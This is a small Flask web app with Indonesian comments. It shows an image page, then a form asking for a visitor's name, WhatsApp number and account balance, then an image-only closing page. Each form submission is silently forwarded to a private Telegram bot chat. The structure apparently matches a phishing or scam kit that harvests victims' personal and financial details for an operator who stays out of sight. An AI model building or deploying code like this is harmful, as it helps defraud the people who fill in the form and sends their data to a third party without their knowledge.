from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/')
def halaman1():
    # Halaman 1 hanya tampil gambar full body
    return render_template('halaman1.html')

@app.route('/halaman2', methods=['GET', 'POST'])
def halaman2():
    if request.method == 'POST':
        nama = request.form.get('nama')
        whatsapp = request.form.get('whatsapp')
        saldo = request.form.get('saldo')

        caption = (
            "🔔DATA BARU:\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱Whatsapp: {whatsapp}\n"
            f"💰Saldo: {saldo}"
        )
        
        requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
            data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
        )

        return redirect('/halaman3')
    return render_template('halaman2.html')

@app.route('/halaman3')
def halaman3():
      # halaman3 hanya tampil gambar penutup full body
    return render_template('halaman3.html')

if __name__ == '__main__':
    app.run(debug=True)

